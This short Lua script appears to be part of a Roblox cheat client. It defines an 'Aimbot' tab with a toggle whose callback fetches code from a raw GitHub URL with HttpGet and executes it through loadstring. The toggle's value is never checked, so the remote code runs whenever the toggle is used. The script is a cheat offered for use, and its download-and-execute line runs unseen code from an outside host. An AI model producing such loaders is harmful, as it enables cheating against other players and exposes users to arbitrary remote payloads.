-- aimbot settings

local Tab = Window:CreateTab("Aimbot", 4483362458) -- Title, Image
local Toggle = Tab:CreateToggle({
   Name = "Enable Aimbot",
   CurrentValue = false,
   Flag = "Aimbot", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
   Callback = function(Value)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/metrofyy/rgrg/main/5gtrgegerg"))()
   -- The variable (Value) is a boolean on whether the toggle is true or false
   end,
})

